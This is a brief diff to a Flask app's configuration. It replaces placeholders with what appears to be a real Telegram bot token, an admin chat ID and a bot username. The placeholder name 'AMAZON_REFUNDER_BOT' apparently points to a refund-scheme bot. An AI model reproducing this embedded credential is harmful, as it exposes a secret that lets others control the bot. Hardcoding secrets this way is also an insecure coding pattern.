@@ -16,9 +16,9 @@ app.config['SESSION_TYPE'] = 'filesystem'
 Session(app)
 
 # ================= CONFIGURATION =================
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
-ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"        # Replace with your admin chat ID
-BOT_USERNAME = "AMAZON_REFUNDER_BOT"        # Your bot username
+TELEGRAM_BOT_TOKEN = "8793157012:AAE5B3bRXtphn2JhLaM9I-SCupDiq1E4g7U"  # Replace with your bot token
+ADMIN_CHAT_ID = "8725194109"        # Replace with your admin chat ID
+BOT_USERNAME = "@pcmoroo_bot"        # Your bot username
 
 # In-memory storage (use proper database in production)
 user_sessions = {}
